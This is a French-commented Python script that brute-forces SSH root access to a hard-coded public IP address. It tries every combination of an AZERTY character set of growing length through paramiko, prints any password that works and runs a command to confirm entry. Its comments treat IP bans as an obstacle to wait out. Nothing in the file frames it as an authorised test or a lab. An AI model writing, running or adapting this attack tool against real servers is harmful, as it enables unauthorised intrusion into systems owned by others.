import paramiko
import itertools
import socket
import time
import sys

# --- 1. CONFIGURATION ---
IP_SERVEUR = "45.137.70.90"
UTILISATEUR = "root"
PORT = 22

# --- 2. DÉFINITION DU CLAVIER AZERTY COMPLET ---
lettres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
chiffres = "0123456789"
speciaux = "&é\"'(-è_çà)=^$ù*,;:!¨£%µ?./§°+~#{}[]|`\\"
TOUT_AZERTY = lettres + chiffres + speciaux


def tenter_connexion(mot_de_passe):
    """Tente une connexion SSH unique avec le mot de passe donné"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=IP_SERVEUR,
            username=UTILISATEUR,
            password=mot_de_passe,
            port=PORT,
            timeout=3,  # On ne patiente pas plus de 3 secondes
            banner_timeout=3
        )
        # Si on arrive ici, c'est que le mot de passe est bon !
        print(f"\n\n✅ VICTOIRE ! Mot de passe trouvé : {mot_de_passe}")

        # On exécute une commande pour prouver la connexion
        stdin, stdout, stderr = client.exec_command('uptime')
        print(f"Info serveur : {stdout.read().decode().strip()}")

        client.close()
        return True

    except paramiko.AuthenticationException:
        # Mot de passe incorrect
        return False

    except (socket.error, paramiko.SSHException) as e:
        # Erreur réseau ou bannissement
        print(f"\n⚠️ Erreur de connexion (IP probablemement bannie) : {e}")
        # On fait une pause de sécurité
        time.sleep(5)
        return False

    except Exception as e:
        print(f"\n❌ Erreur inattendue : {e}")
        return False
    finally:
        client.close()


def demarrer_brute_force():
    print(f"Cible : {UTILISATEUR}@{IP_SERVEUR}")
    print(f"Jeu de caractères : {len(TOUT_AZERTY)} symboles.")
    print("Démarrage de l'attaque incrémentale...")

    # On commence à la longueur 1 et on augmente indéfiniment
    # range(1, 20) signifie de 1 caractère jusqu'à 19 caractères
    for longueur in range(1, 20):

        # Calcul du nombre de combinaisons pour cette longueur
        nb_combinaisons = len(TOUT_AZERTY) ** longueur
        print(f"\n--- Passage à la longueur {longueur} ({nb_combinaisons:,} possibilités) ---")

        # Création du générateur de combinaisons
        generateur = itertools.product(TOUT_AZERTY, repeat=longueur)

        compteur = 0

        for tuple_chars in generateur:
            # On recompose le mot de passe (ex: ('a', 'b') devient "ab")
            mot_de_passe = "".join(tuple_chars)

            # Affichage visuel (écrase la ligne précédente pour ne pas spammer le terminal)
            sys.stdout.write(f"\r[{longueur}] Test {compteur + 1}/{nb_combinaisons} : {mot_de_passe}")
            sys.stdout.flush()

            # Tentative réelle
            succes = tenter_connexion(mot_de_passe)

            if succes:
                print("\nFin du programme.")
                return  # On arrête tout, on a trouvé

            compteur += 1


if __name__ == "__main__":
    try:
        demarrer_brute_force()
    except KeyboardInterrupt:
        print("\n\nArrêt manuel du script.")